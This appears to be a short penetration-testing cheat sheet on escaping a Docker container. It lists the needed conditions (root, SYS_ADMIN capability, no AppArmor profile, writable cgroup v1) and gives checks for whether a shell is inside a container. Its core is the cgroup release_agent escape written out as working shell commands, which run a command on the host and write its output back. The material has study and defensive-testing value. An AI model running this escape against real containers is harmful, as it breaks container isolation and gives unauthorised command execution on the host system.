Docker Escape

# Docker Escape
## Links
- https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
- https://tuhrig.de/how-to-know-you-are-inside-a-docker-container/

### Requirements
- Running as root inside container
- Container must have SYS_ADMIN linux capability
- Container lacks AppArmor profile
- Cgroup v1 virtual filesystem must be mounted read-write inside the container


#### Checking if inside docker container
   - [ ] .dockerenv files
   - [ ] check control groups for /docker/
   		-  `cat /proc/1/cgroup`  
		-  `cat /proc/self/cgroup`
#### Checking if docker container has SYS_ADMIN
- attempt to perform mount command 


## Code
- Writeups online mention that the docker container must be privileged but really it seems to boil down to having the SYS_ADMIN linux capability which allows you to perform **mount**

```
mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x
 
echo 1 &gt; /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo &quot;$host_path/cmd&quot; &gt; /tmp/cgrp/release_agent
 
echo '#!/bin/sh' &gt; /cmd
echo &quot;ps aux &gt; $host_path/output&quot; &gt;&gt; /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs";
```